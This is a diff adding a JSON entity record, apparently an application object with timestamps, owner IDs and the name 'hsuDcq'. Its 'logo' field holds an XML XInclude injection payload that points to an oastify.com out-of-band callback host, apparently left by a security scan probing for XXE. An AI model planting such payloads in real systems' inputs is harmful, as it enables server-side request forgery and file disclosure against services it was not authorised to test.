@@ -1,0 +1,15 @@
+{
+	"createdTime":1741342198345,
+	"deleted":false,
+	"enabled":false,
+	"id":"67cac5f619d8a25fc18fa840",
+	"lastModifiedBy":22743,
+	"lcName":"hsudcq",
+	"logo":"<uvb xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://unl1q8s1o43ugcdvztsvagwcy34wsxjlk9cw3ks.oastify.com/foo\"/></uvb>",
+	"modifiedTime":1741342198345,
+	"name":"hsuDcq",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
